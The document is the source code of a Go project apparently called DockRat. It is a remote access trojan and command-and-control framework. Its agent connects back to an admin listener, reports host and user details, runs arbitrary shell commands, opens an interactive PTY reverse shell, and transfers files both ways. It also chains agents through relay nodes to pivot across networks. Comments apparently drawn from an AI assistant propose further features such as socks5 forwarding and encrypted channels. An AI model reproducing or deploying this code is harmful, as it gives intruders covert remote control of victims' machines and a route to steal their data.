子文件夹：./cmd
子文件夹：./cmd/admin
文件：./cmd/admin/main.go
内容：


package main

import (
	"log"

	"github.com/Singert/DockRat/core/network"
	"github.com/Singert/DockRat/core/protocol"
	"github.com/Singert/DockRat/core/node"
)

var registry = node.NewRegistry()

func main() {
	log.Println("[+] Admin starting...")

	// 启动控制台命令处理
	go protocol.StartConsole(registry)

	// 启动监听并处理 Agent 连接
	network.StartListener(":9999", registry)
}


/*
响应消息（如 MsgResponse）缓存起来，以便在控制台中输出最近一条响应？
你也可以将 MsgShell 输出定向到带颜色或带提示的终端 UI，后续支持退出、上传等命令扩展。
如需进一步支持 shell 会话保持、窗口调整、或 stdout 缓存，
*/

子文件夹：./cmd/agent
文件：./cmd/agent/main.go
内容：
package main

import (
	"encoding/json"
	"log"
	"net"
	"os"
	"runtime"

	"github.com/Singert/DockRat/core/network"
	"github.com/Singert/DockRat/core/protocol"
)

type HandshakePayload struct {
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	OS       string `json:"os"`
	SelfID   int    `json:"self_id"`   // 当前 agent 的 ID
	ParentID int    `json:"parent_id"` // 初始为 -1，表示没有父节点
}

func main() {
	adminAddr := "127.0.0.1:9999"
	conn, err := net.Dial("tcp", adminAddr)
	if err != nil {
		log.Fatalf("[-] Failed to connect to admin: %v", err)
	}
	log.Println("[+] Connected to admin!")

	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}

	payload := HandshakePayload{
		Hostname: hostname,
		Username: username,
		OS:       runtime.GOOS,
		ParentID: -1, //初始为 -1，表示没有父节点
	}
	payloadBytes, _ := json.Marshal(payload)

	msg := protocol.Message{
		Type:    protocol.MsgHandshake,
		Payload: payloadBytes,
	}

	data, err := protocol.EncodeMessage(msg)
	if err != nil {
		log.Fatalf("[-] Failed to encode message: %v", err)
	}

	_, err = conn.Write(data)
	if err != nil {
		log.Fatalf("[-] Failed to send message: %v", err)
	}

	log.Println("[+] Handshake message sent")

	network.StartAgent(&network.AgentContext{
		SelfID:     1,
		Conn:       conn,
		ParentConn: nil, // 顶级 agent，无上层
	})
}

/*是否继续实现：

    🐚 持久化 shell 模式（交互式 stdin/stdout）

    🛰️ socks5 转发或端口映射

    🔐 TLS/AES 加密通信层

你可以指定想优先开发的子模块。 */

子文件夹：./core
子文件夹：./core/common
文件：./core/common/config.go
内容：
package common
文件：./core/common/logger.go
内容：
package common

子文件夹：./core/crypto
文件：./core/crypto/cipher.go
内容：
package crypto
子文件夹：./core/network
文件：./core/network/connection.go
内容：
package network

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"

	"github.com/Singert/DockRat/core/node"
	"github.com/Singert/DockRat/core/protocol"
	"github.com/Singert/DockRat/core/utils"
)

type HandshakePayload struct {
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	OS       string `json:"os"`
	ParentID int    `json:"parent_id"` // 初始为 -1，表示没有父节点
}

func StartListener(addr string, registry *node.Registry) {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		log.Fatalf("[!] Failed to listen on %s: %v", addr, err)
	}
	log.Printf("[+] Listening on %s", addr)

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Println("[!] Accept error:", err)
			continue
		}
		go handleConnection(conn, registry)
	}
}

func handleConnection(conn net.Conn, registry *node.Registry) {
	log.Printf("[+] New connection from %s", conn.RemoteAddr())

	lengthBuf := make([]byte, 4)
	if _, err := io.ReadFull(conn, lengthBuf); err != nil {
		log.Println("[!] Failed to read message length:", err)
		conn.Close()
		return
	}
	length := utils.BytesToUint32(lengthBuf)
	data := make([]byte, length)
	if _, err := io.ReadFull(conn, data); err != nil {
		log.Println("[!] Failed to read message body:", err)
		conn.Close()
		return
	}

	msg, err := protocol.DecodeMessage(data)
	if err != nil {
		log.Println("[!] Failed to decode message:", err)
		conn.Close()
		return
	}

	if msg.Type == protocol.MsgHandshake {
		var payload HandshakePayload
		if err := json.Unmarshal(msg.Payload, &payload); err != nil {
			log.Println("[!] Failed to decode handshake payload:", err)
			conn.Close()
			return
		}

		n := &node.Node{
			Conn:     conn,
			Hostname: payload.Hostname,
			Username: payload.Username,
			OS:       payload.OS,
			Addr:     conn.RemoteAddr().String(),
			ParentID: payload.ParentID,
		}
		id := registry.Add(n)

		log.Printf("[+] Registered agent ID %d - %s@%s (%s)", id, n.Username, n.Hostname, n.OS)

		go handleAgentMessages(n, registry)
	} else {
		log.Println("[!] Unknown message type:", msg.Type)
		conn.Close()
	}
}

func handleAgentMessages(n *node.Node, registry *node.Registry) {
	conn := n.Conn
	for {
		lengthBuf := make([]byte, 4)
		if _, err := io.ReadFull(conn, lengthBuf); err != nil {
			log.Printf("[-] Node %d disconnected: %v", n.ID, err)
			registry.Remove(n.ID)
			conn.Close()
			return
		}
		length := utils.BytesToUint32(lengthBuf)
		data := make([]byte, length)
		if _, err := io.ReadFull(conn, data); err != nil {
			log.Printf("[-] Node %d read failed: %v", n.ID, err)
			registry.Remove(n.ID)
			conn.Close()
			return
		}

		msg, err := protocol.DecodeMessage(data)
		if err != nil {
			log.Printf("[-] Node %d decode failed: %v", n.ID, err)
			continue
		}

		switch msg.Type {
		case protocol.MsgResponse:
			log.Printf("[#] Node %d response:\n%s", n.ID, string(msg.Payload))
		case protocol.MsgShell:
			fmt.Print(string(msg.Payload))
		default:
			log.Printf("[-] Node %d sent unknown message type: %s", n.ID, msg.Type)
		}
	}
}

文件：./core/network/dispatcher.go
内容：
package network

import (
	"encoding/json"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"

	"github.com/Singert/DockRat/core/protocol"
	"github.com/Singert/DockRat/core/utils"
	"github.com/creack/pty"
)

// 封装每个 agent 实例上下文
type AgentContext struct {
	SelfID     int
	Conn       net.Conn
	ParentConn net.Conn
}

var shellStarted = false
var shellStdin io.WriteCloser

var currentUploadFile *os.File

var childConnMap = make(map[int]net.Conn)
var childConnMu sync.Mutex

// 用于延迟绑定连接
var pendingConns []net.Conn
var pendingMu sync.Mutex

func StartAgent(ctx *AgentContext) {
	conn := ctx.Conn
	selfID := ctx.SelfID
	parent := ctx.ParentConn

	for {
		lengthBuf := make([]byte, 4)
		if _, err := io.ReadFull(conn, lengthBuf); err != nil {
			log.Printf("[-] Connection closed or failed: %v", err)
			return
		}
		length := utils.BytesToUint32(lengthBuf)
		data := make([]byte, length)
		if _, err := io.ReadFull(conn, data); err != nil {
			log.Printf("[-] Failed to read message body: %v", err)
			return
		}

		msg, err := protocol.DecodeMessage(data)
		if err != nil {
			log.Printf("[-] Decode error: %v", err)
			continue
		}

		if msg.ToNodeID != 0 {
			relayToChild(msg)
			continue
		}

		switch msg.Type {
		case protocol.MsgCommand:
			handleCommand(msg, conn, selfID, parent)
		case protocol.MsgShell:
			if msg.FromNodeID == 0 {
				handleShellPTY(msg, conn, selfID, parent)
			} else {
				if parent != nil {
					relayUpward(msg, parent)
				} else {
					conn.Write(data)
				}
			}
		case protocol.MsgResponse:
			if parent != nil {
				relayUpward(msg, parent)
			} else {
				encoded, _ := protocol.EncodeMessage(msg)
				conn.Write(encoded)
			}
		case protocol.MsgUploadInit:
			handleUploadInit(msg)
		case protocol.MsgUploadChunk:
			handleUploadChunk(msg)
		case protocol.MsgUploadDone:
			handleUploadDone()
		case protocol.MsgDownloadInit:
			handleDownloadInit(msg, conn)
		case protocol.MsgListen:
			handleListenCommand(msg, ctx)
		case protocol.MsgConnect:
			handleConnectCommand(msg)
		case protocol.MsgBindRelayConn:
			handleBindRelayConn(msg)
		default:
			log.Println("[-] Unknown message type:", msg.Type)
		}
	}
}

func relayToChild(msg protocol.Message) {
	childConnMu.Lock()
	conn, ok := childConnMap[msg.ToNodeID]
	childConnMu.Unlock()

	if !ok {
		log.Printf("[-] No child with ID %d found for relay\n", msg.ToNodeID)
		return
	}

	data, err := protocol.EncodeMessage(msg)
	if err != nil {
		log.Println("[-] Relay encode error:", err)
		return
	}
	conn.Write(data)
}

func handleCommand(msg protocol.Message, conn net.Conn, selfID int, parent net.Conn) {
	var payload map[string]string
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] Command unmarshal error:", err)
		return
	}
	cmdStr := payload["cmd"]
	log.Println("[+] Received command:", cmdStr)

	output, err := exec.Command("sh", "-c", cmdStr).CombinedOutput()
	if err != nil {
		output = append(output, []byte("\n[!] Command error: "+err.Error())...)
	}

	resp := protocol.Message{
		Type:       protocol.MsgResponse,
		Payload:    output,
		FromNodeID: selfID,
	}
	data, _ := protocol.EncodeMessage(resp)
	conn.Write(data)
}

func handleShellPTY(msg protocol.Message, conn net.Conn, selfID int, parent net.Conn) {
	line := string(msg.Payload)

	if !shellStarted {
		cmd := exec.Command("/bin/sh")
		ptmx, err := pty.Start(cmd)
		if err != nil {
			log.Println("[-] Failed to start pty:", err)
			return
		}
		shellStarted = true
		shellStdin = ptmx

		go func() {
			buf := make([]byte, 1024)
			for {
				n, err := ptmx.Read(buf)
				if err != nil {
					log.Println("[-] Shell read error:", err)
					return
				}
				msg := protocol.Message{
					Type:       protocol.MsgShell,
					Payload:    buf[:n],
					FromNodeID: selfID,
				}
				data, err := protocol.EncodeMessage(msg)
				if err != nil {
					log.Println("[-] Shell encode error:", err)
					return
				}
				conn.Write(data)
			}
		}()
		return
	}

	if !strings.HasSuffix(line, "\n") {
		line += "\n"
	}
	shellStdin.Write([]byte(line))
}

func handleUploadInit(msg protocol.Message) {
	var payload protocol.UploadInitPayload
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] UploadInit decode error:", err)
		return
	}

	file, err := os.Create(payload.Filename)
	if err != nil {
		log.Println("[-] Failed to create upload file:", err)
		return
	}

	currentUploadFile = file
	log.Printf("[+] Start receiving file: %s (%d bytes)", payload.Filename, payload.Filesize)
}

func handleUploadChunk(msg protocol.Message) {
	if currentUploadFile == nil {
		log.Println("[-] Received chunk with no open file")
		return
	}

	var chunk protocol.UploadChunkPayload
	if err := json.Unmarshal(msg.Payload, &chunk); err != nil {
		log.Println("[-] Upload chunk decode error:", err)
		return
	}
	_, err := currentUploadFile.Write(chunk.Data)
	if err != nil {
		log.Println("[-] Write chunk failed:", err)
	}
}

func handleUploadDone() {
	if currentUploadFile != nil {
		currentUploadFile.Close()
		currentUploadFile = nil
		log.Println("[+] Upload complete")
	} else {
		log.Println("[-] Upload done received with no open file")
	}
}

func handleDownloadInit(msg protocol.Message, conn net.Conn) {
	var payload protocol.DownloadInitPayload
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] DownloadInit decode error:", err)
		return
	}

	file, err := os.Open(payload.Filename)
	if err != nil {
		log.Println("[-] Cannot open file for download:", err)
		return
	}
	defer file.Close()

	buf := make([]byte, 4096)
	for {
		n, err := file.Read(buf)
		if n > 0 {
			chunk := protocol.DownloadChunkPayload{Data: buf[:n]}
			data, _ := json.Marshal(chunk)
			msg := protocol.Message{Type: protocol.MsgDownloadChunk, Payload: data}
			packet, _ := protocol.EncodeMessage(msg)
			conn.Write(packet)
		}
		if err == io.EOF {
			break
		}
		if err != nil {
			log.Println("[-] File read error:", err)
			return
		}
	}
	done := protocol.Message{Type: protocol.MsgDownloadDone, Payload: []byte("done")}
	pkt, _ := protocol.EncodeMessage(done)
	conn.Write(pkt)
	log.Println("[+] File download finished")
}

func handleListenCommand(msg protocol.Message, ctx *AgentContext) {
	var payload map[string]string
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] Listen command decode failed:", err)
		return
	}
	port := payload["port"]
	go func() {
		ln, err := net.Listen("tcp", ":"+port)
		if err != nil {
			log.Println("[-] Agent listen failed:", err)
			return
		}
		log.Println("[+] Agent listening on port", port)
		for {
			conn, err := ln.Accept()
			if err != nil {
				log.Println("[-] Accept failed:", err)
				continue
			}
			go handleChildConn(conn, ctx.Conn) // 保持不变，parentConn 会在 handleChildConn 中传入
		}
	}()
}

func handleConnectCommand(msg protocol.Message) {
	var payload map[string]string
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] Connect command decode failed:", err)
		return
	}
	target := payload["target"]
	parentIDStr := payload["parent_id"] // 当前节点的 ID，将作为 child 的 parent
	parentID, _ := strconv.Atoi(parentIDStr)
	conn, err := net.Dial("tcp", target)
	if err != nil {
		log.Println("[-] Failed to connect target:", err)
		return
	}
	log.Println("[+] Connected to parent agent", target)

	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}

	// 注意：这个 parent_id 会被对方当作 selfID 使用
	payloadData := map[string]interface{}{
		"hostname": hostname,
		"username": username,
		"os":       runtime.GOOS,
		"relay_id": parentID,
	}
	data, _ := json.Marshal(payloadData)
	msgToSend := protocol.Message{
		Type:    protocol.MsgHandshake,
		Payload: data,
	}
	packet, _ := protocol.EncodeMessage(msgToSend)
	conn.Write(packet)

	// 将 conn 作为子节点的连接，自己是 parent（nil）→ 被连接端来处理 StartAgent
	// 不调用 StartAgent(conn)！StartAgent 应在 handleChildConn 中由上级执行
}

func handleChildConn(conn net.Conn, parentConn net.Conn) {
	log.Println("[+] Received child connection from", conn.RemoteAddr())

	// 读取 4 字节长度前缀
	lengthBuf := make([]byte, 4)
	if _, err := io.ReadFull(conn, lengthBuf); err != nil {
		log.Println("[-] Failed to read handshake length:", err)
		conn.Close()
		return
	}
	length := utils.BytesToUint32(lengthBuf)

	// 读取消息内容
	data := make([]byte, length)
	if _, err := io.ReadFull(conn, data); err != nil {
		log.Println("[-] Failed to read handshake data:", err)
		conn.Close()
		return
	}

	// 解码 handshake 消息
	msg, err := protocol.DecodeMessage(data)
	if err != nil || msg.Type != protocol.MsgHandshake {
		log.Println("[-] Invalid handshake from child")
		conn.Close()
		return
	}
	// 提取 relay_id（表示 admin 分配的最终 nodeID）
	var payload map[string]interface{}
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] Failed to parse handshake payload:", err)
		conn.Close()
		return
	}
	idFloat, ok := payload["relay_id"].(float64)
	if !ok {
		log.Println("[-] Missing relay_id in handshake")
		conn.Close()
		return
	}
	relayID := int(idFloat)

	// 将连接存入 pendingConns，等待绑定指令
	pendingMu.Lock()
	pendingConns = append(pendingConns, conn)
	pendingMu.Unlock()
	log.Println("[+] Child handshake received, storing connection as pending")

	// 启动该连接的命令处理循环（SelfID 暂未知）
	go StartAgent(&AgentContext{
		SelfID:     -2, // 真实 ID 尚未分配
		Conn:       conn,
		ParentConn: parentConn,
	})
	// 通知 admin 或上级 relay：“我有一个连接，目标是 relayID，请绑定我”
	bindPayload := protocol.BindRelayConnPayload{ID: relayID}
	bindData, _ := json.Marshal(bindPayload)
	bindMsg := protocol.Message{
		Type:    protocol.MsgBindRelayConn,
		Payload: bindData,
	}
	buf, _ := protocol.EncodeMessage(bindMsg)
	_, err = parentConn.Write(buf)
	if err != nil {
		log.Printf("[-] Failed to send BindRelayConn to parent: %v\n", err)
	} else {
		log.Printf("[*] Sent BindRelayConn to parent for ID %d\n", relayID)
	}

}

func relayUpward(msg protocol.Message, parent net.Conn) {
	data, err := protocol.EncodeMessage(msg)
	if err != nil {
		log.Println("[-] Relay upward encode error:", err)
		return
	}
	_, err = parent.Write(data)
	if err != nil {
		log.Println("[-] Relay upward write failed:", err)
	}
}

func handleBindRelayConn(msg protocol.Message) {
	var payload protocol.BindRelayConnPayload
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] BindRelayConn decode error:", err)
		return
	}

	pendingMu.Lock()
	defer pendingMu.Unlock()

	if len(pendingConns) == 0 {
		log.Println("[-] No pending conn to bind")
		return
	}

	conn := pendingConns[0]
	pendingConns = pendingConns[1:]

	childConnMu.Lock()
	childConnMap[payload.ID] = conn
	childConnMu.Unlock()

	log.Printf("[+] Bound pending connection as node ID %d\n", payload.ID)
}

文件：./core/network/packet.go
内容：
package network
子文件夹：./core/node
文件：./core/node/registry.go
内容：
package node

import (
	"fmt"
	"net"
	"sync"
)

type Node struct {
	ID       int
	ParentID int
	Conn     net.Conn
	Hostname string
	Username string
	OS       string
	Addr     string
}

type Registry struct {
	nodes  map[int]*Node
	mu     sync.Mutex
	nextID int
}

func NewRegistry() *Registry {
	return &Registry{
		nodes: make(map[int]*Node),
	}
}

func (r *Registry) Add(node *Node) int {
	r.mu.Lock()
	defer r.mu.Unlock()

	id := r.nextID
	node.ID = id
	r.nodes[id] = node
	r.nextID++
	return id
}

func (r *Registry) List() []*Node {
	r.mu.Lock()
	defer r.mu.Unlock()

	nodes := make([]*Node, 0, len(r.nodes))
	for _, node := range r.nodes {
		nodes = append(nodes, node)
	}
	return nodes
}

func (r *Registry) Get(id int) (*Node, bool) {
	r.mu.Lock()
	defer r.mu.Unlock()
	node, ok := r.nodes[id]
	return node, ok
}

func (r *Registry) Remove(id int) {
	r.mu.Lock()
	defer r.mu.Unlock()
	delete(r.nodes, id)
}

func (r *Registry) GetChildren(parentID int) []*Node {
	r.mu.Lock()
	defer r.mu.Unlock()

	children := []*Node{}
	for _, node := range r.nodes {
		if node.ParentID == parentID {
			children = append(children, node)
		}
	}
	return children
}

func (n *Node) String() string {
	return fmt.Sprintf("Node[%d] -> IP: %s, Hostname: %s, User: %s, OS: %s",
		n.ID, n.Addr, n.Hostname, n.Username, n.OS)
}

/*
现在你的 NodeRegistry 已具备完整的增、删、查、列能力，下一步你可以轻松支持：

    控制指定节点：通过 registry.Get(id) 发送命令

    实现自动断线剔除：通过 Remove(id) 清除离线节点
*/

文件：./core/node/topology.go
内容：
package node
子文件夹：./core/protocol
文件：./core/protocol/command.go
内容：
package protocol

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"strings"

	"github.com/Singert/DockRat/core/node"
	"github.com/Singert/DockRat/core/utils"
)

var downloadChan = make(chan []byte, 100)

var currentNodeID = -1

func StartConsole(registry *node.Registry) {
	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("(admin) >> ")
		if !scanner.Scan() {
			break
		}
		input := strings.TrimSpace(scanner.Text())
		if input == "" {
			continue
		}

		tokens := strings.SplitN(input, " ", 2)
		cmd := tokens[0]
		arg := ""
		if len(tokens) > 1 {
			arg = tokens[1]
		}

		switch cmd {
		case "detail":
			handleDetail(registry)
		case "exec":
			handleExec(arg, registry)
		case "shell":
			handleShell(arg, registry)
		case "upload":
			handleUpload(arg, registry)
		case "download":
			handleDownload(arg, registry)
		case "listen":
			handleListen(arg, registry)
		case "connect":
			handleConnect(arg, registry)
		case "use":
			handleUse(arg, registry)
		case "topo":
			handleTopo(registry)
		case "whoami":
			fmt.Printf("[*] Current node ID: %d\n", currentNodeID)
		default:
			fmt.Println("[-] Unknown command")
		}
	}
}

func handleDetail(reg *node.Registry) {
	nodes := reg.List()
	fmt.Println("[+] Connected nodes:")
	for _, n := range nodes {
		fmt.Printf("  Node[%d] -> IP: %s, Hostname: %s, User: %s, OS: %s, ParentID: %d\n",
			n.ID, n.Addr, n.Hostname, n.Username, n.OS, n.ParentID)
	}
}

func handleExec(arg string, reg *node.Registry) {
	if currentNodeID == -1 {
		fmt.Println("[-] No node selected. Use `use <id>` first.")
		return
	}
	n, ok := reg.Get(currentNodeID)
	if !ok {
		fmt.Println("[-] Node not found")
		return
	}

	cmdPayload := map[string]string{"cmd": arg}
	data, _ := json.Marshal(cmdPayload)
	msg := Message{
		Type:     MsgCommand,
		Payload:  data,
		ToNodeID: currentNodeID,
	}
	buf, err := EncodeMessage(msg)
	if err != nil {
		fmt.Println("[-] Encode failed:", err)
		return
	}
	_, err = n.Conn.Write(buf)
	if err != nil {
		fmt.Println("[-] Send failed:", err)
		return
	}
}

func handleShell(_ string, reg *node.Registry) {
	if currentNodeID == -1 {
		fmt.Println("[-] No node selected. Use `use <id>` first.")
		return
	}
	n, ok := reg.Get(currentNodeID)
	if !ok {
		fmt.Println("[-] Node not found")
		return
	}

	msg := Message{
		Type:     MsgShell,
		Payload:  []byte("start shell"),
		ToNodeID: currentNodeID,
	}
	buf, err := EncodeMessage(msg)
	if err != nil {
		fmt.Println("[-] Encode failed:", err)
		return
	}
	_, err = n.Conn.Write(buf)
	if err != nil {
		fmt.Println("[-] Send failed:", err)
		return
	}

	fmt.Println("[+] Shell started. Type commands (type 'exit' to quit):")
	inputScanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("remote$ ")
		if !inputScanner.Scan() {
			break
		}
		line := inputScanner.Text()
		if strings.TrimSpace(line) == "exit" {
			fmt.Println("[*] Exiting shell mode.")
			break
		}
		cmdMsg := Message{
			Type:     MsgShell,
			Payload:  []byte(line + "\n"),
			ToNodeID: currentNodeID,
		}
		buf, err := EncodeMessage(cmdMsg)
		if err != nil {
			fmt.Println("[-] Shell encode error:", err)
			break
		}
		_, err = n.Conn.Write(buf)
		if err != nil {
			fmt.Println("[-] Shell write error:", err)
			break
		}
	}
}

func readShellOutput(conn io.Reader) {
	for {
		lengthBuf := make([]byte, 4)
		if _, err := io.ReadFull(conn, lengthBuf); err != nil {
			fmt.Println("[-] Shell read error:", err)
			return
		}
		length := utils.BytesToUint32(lengthBuf)
		data := make([]byte, length)
		if _, err := io.ReadFull(conn, data); err != nil {
			fmt.Println("[-] Shell read body error:", err)
			return
		}
		msg, err := DecodeMessage(data)
		if err != nil {
			fmt.Println("[-] Shell decode error:", err)
			return
		}
		if msg.Type == MsgShell {
			fmt.Printf(string(msg.Payload))
		}
	}
}

func handleUpload(arg string, registry *node.Registry) {
	if currentNodeID == -1 {
		fmt.Println("[-] No node selected. Use `use <id>` first.")
		return
	}
	n, ok := registry.Get(currentNodeID)
	if !ok {
		fmt.Println("[-] No such node")
		return
	}

	parts := strings.SplitN(arg, " ", 2)
	if len(parts) != 2 {
		fmt.Println("[-] Usage: upload <local_file> <remote_file>")
		return
	}

	local := strings.TrimSpace(parts[0])
	remote := strings.TrimSpace(parts[1])

	file, err := os.Open(local)
	if err != nil {
		fmt.Println("[-] Failed to open file:", err)
		return
	}
	defer file.Close()

	fileInfo, err := file.Stat()
	if err != nil {
		fmt.Println("[-] Failed to get file info:", err)
		return
	}

	initPayload := UploadInitPayload{
		Filename: remote,
		Filesize: fileInfo.Size(),
	}
	payloadBytes, err := json.Marshal(initPayload)
	if err != nil {
		fmt.Println("[-] Failed to marshal init payload:", err)
		return
	}
	msg := Message{
		Type:     MsgUploadInit,
		Payload:  payloadBytes,
		ToNodeID: currentNodeID,
	}
	buf, err := EncodeMessage(msg)
	if err != nil {
		fmt.Println("[-] Message encode failed:", err)
		return
	}
	n.Conn.Write(buf)

	reader := bufio.NewReader(file)
	chunkSize := 4096
	bufData := make([]byte, chunkSize)
	for {
		nr, err := reader.Read(bufData)
		if nr > 0 {
			chunk := UploadChunkPayload{
				Data: bufData[:nr]}
			data, _ := json.Marshal(chunk)
			msg := Message{
				Type:     MsgUploadChunk,
				Payload:  data,
				ToNodeID: currentNodeID,
			}
			pkt, _ := EncodeMessage(msg)
			n.Conn.Write(pkt)
		}
		if err == io.EOF {
			break
		}
		if err != nil {
			fmt.Println("Upload read error:", err)
			return
		}
	}
	done := Message{
		Type:     MsgUploadDone,
		Payload:  []byte("done"),
		ToNodeID: currentNodeID,
	}
	pkt, _ := EncodeMessage(done)
	n.Conn.Write(pkt)
	fmt.Println("[+] Upload completed")
}

func handleDownload(arg string, registry *node.Registry) {
	if currentNodeID == -1 {
		fmt.Println("[-] No node selected. Use `use <id>` first.")
		return
	}
	n, ok := registry.Get(currentNodeID)
	if !ok {
		fmt.Println("[-] No such node")
		return
	}

	parts := strings.SplitN(arg, " ", 2)
	if len(parts) != 2 {
		fmt.Println("[-] Usage: download <remote_file> <local_file>")
		return
	}

	remote := strings.TrimSpace(parts[0])
	local := strings.TrimSpace(parts[1])

	req := DownloadInitPayload{Filename: remote}
	data, _ := json.Marshal(req)
	msg := Message{Type: MsgDownloadInit, Payload: data, ToNodeID: currentNodeID}
	buf, _ := EncodeMessage(msg)
	n.Conn.Write(buf)

	out, err := os.Create(local)
	if err != nil {
		fmt.Println("[-] Create file error:", err)
		return
	}
	defer out.Close()

	for chunk := range downloadChan {
		var payload DownloadChunkPayload
		json.Unmarshal(chunk, &payload)
		out.Write(payload.Data)
	}
	fmt.Println("[+] Download complete")
}

func handleListen(arg string, reg *node.Registry) {
	parts := strings.Split(arg, " ")
	if len(parts) != 2 {
		fmt.Println("[-] Usage: listen <node_id> <port>")
		return
	}
	var nid int
	fmt.Sscanf(parts[0], "%d", &nid)
	port := parts[1]

	n, ok := reg.Get(nid)
	if !ok {
		fmt.Println("[-] No such node")
		return
	}

	payload := map[string]string{
		"port": port,
	}
	data, _ := json.Marshal(payload)
	msg := Message{
		Type:    MsgListen,
		Payload: data,
	}
	buf, _ := EncodeMessage(msg)
	n.Conn.Write(buf)
	fmt.Println("[+] Listen command sent")
}

func handleConnect(arg string, reg *node.Registry) {
	parts := strings.Split(arg, " ")
	if len(parts) != 3 {
		fmt.Println("[-] Usage: connect <node_id> <ip:port> <parentID>")
		return
	}
	var nid, pid int
	fmt.Sscanf(parts[0], "%d", &nid)
	target := parts[1]
	fmt.Sscanf(parts[2], "%d", &pid)

	n, ok := reg.Get(nid)
	if !ok {
		fmt.Println("[-] No such node")
		return
	}

	payload := map[string]string{
		"target":    target,
		"parent_id": fmt.Sprintf("%d", pid),
	}
	data, _ := json.Marshal(payload)
	msg := Message{
		Type:    MsgConnect,
		Payload: data,
	}
	buf, _ := EncodeMessage(msg)
	n.Conn.Write(buf)
	fmt.Println("[+] Connect command sent")
	fmt.Printf("[*] Connecting node %d to %s via parent %d\n", nid, target, pid)

}

func handleUse(arg string, reg *node.Registry) {
	var nid int
	fmt.Sscanf(arg, "%d", &nid)
	if _, ok := reg.Get(nid); !ok {
		fmt.Println("[-] No such node")
		return
	}
	currentNodeID = nid
	fmt.Printf("[+] Switched to node %d\n", nid)
}

func handleTopo(reg *node.Registry) {
	var printNode func(id int, depth int)
	printNode = func(id int, depth int) {
		n, ok := reg.Get(id)
		if !ok {
			return
		}
		fmt.Printf("%s[%d] %s@%s\n", strings.Repeat("  ", depth), id, n.Username, n.Hostname)
		for _, child := range reg.GetChildren(id) {
			printNode(child.ID, depth+1)
		}
	}

	fmt.Println("[+] Topology Tree:")
	for _, node := range reg.List() {
		if node.ParentID == -1 {
			printNode(node.ID, 0)
		}
	}
}

文件：./core/protocol/file_transfer.go
内容：
package protocol

const (
	MsgUploadInit  MessageType = "upload_init"  // 初始化上传请求（含文件名和长度）
	MsgUploadChunk MessageType = "upload_chunk" // 上传数据块
	MsgUploadDone  MessageType = "upload_done"  // 上传完成通知

	MsgDownloadInit  MessageType = "download_init"  // 请求下载文件
	MsgDownloadChunk MessageType = "download_chunk" // 下载数据块
	MsgDownloadDone  MessageType = "download_done"  // 下载完成通知
)

type UploadInitPayload struct {
	Filename string `json:"filename"`
	Filesize int64  `json:"filesize"`
}

type UploadChunkPayload struct {
	Data []byte `json:"data"`
}

type DownloadInitPayload struct {
	Filename string `json:"filename"`
}

type DownloadChunkPayload struct {
	Data []byte `json:"data"`
}

文件：./core/protocol/message.go
内容：
package protocol

import (
	"bytes"
	"encoding/binary"
	"encoding/json"
	"fmt"
)

// MessageType 定义了消息类型，如 handshake、shell、upload 等
type MessageType string

const (
	MsgHandshake MessageType = "handshake"
	MsgHeartbeat MessageType = "heartbeat"
	MsgCommand   MessageType = "command"
	MsgResponse  MessageType = "response"
	MsgShell     MessageType = "shell"
	// 拓扑相关消息	「
	MsgListen        MessageType = "listen"
	MsgConnect       MessageType = "connect"
	MsgBindRelayConn MessageType = "bind_relay_conn" // 用于转发连接请求的回复
)

// Message 是基本通信结构
// 结构体经过 JSON 编码后再加上长度前缀发送
type Message struct {
	Type       MessageType // such as handshake,shell,upload
	Payload    []byte      // the data to be sent, such as command or file content
	ToNodeID   int         `json:"to,omitempty"`   // 目标节点ID，,该字段仅由 admin → relay agent 时设置，用于转发给 child 节点
	FromNodeID int         `json:"from,omitempty"` // 源节点ID，通常由 agent → relay agent 时设置
}

type BindRelayConnPayload struct {
	ID int `json:"id"` // 要绑定的目标 Node ID
}

// EncodeMessage 将Message编码带长度前缀的字节流
func EncodeMessage(msg Message) ([]byte, error) {
	data, err := json.Marshal(msg)
	if err != nil {
		return nil, err
	}
	buf := new(bytes.Buffer)
	// 写入长度前缀(大端字节序)
	err = binary.Write(buf, binary.BigEndian, uint32(len(data)))
	if err != nil {
		return nil, err
	}
	// 写入消息内容
	_, err = buf.Write(data)
	if err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// DecodeMessage 从带长度前缀的字节流解码为Message
func DecodeMessage(data []byte) (Message, error) {
	var msg Message
	if err := json.Unmarshal(data, &msg); err != nil {
		return msg, fmt.Errorf("decode json: %w", err)
	}
	return msg, nil
}

// ReadMessage 从连接中读取一个完整的消息帧（包括长度前缀和内容）
func ReadMessage(reader *bytes.Reader) (Message, error) {
	var length uint32
	if err := binary.Read(reader, binary.BigEndian, &length); err != nil {
		return Message{}, fmt.Errorf("read length: %w", err)
	}
	msgData := make([]byte, length)
	if _, err := reader.Read(msgData); err != nil {
		return Message{}, fmt.Errorf("read payload: %w", err)
	}
	return DecodeMessage(msgData)

}

子文件夹：./core/utils
文件：./core/utils/utils.go
内容：
package utils

func BytesToUint32(b []byte) uint32 {
	return uint32(b[0])<<24 | uint32(b[1])<<16 | uint32(b[2])<<8 | uint32(b[3])
}

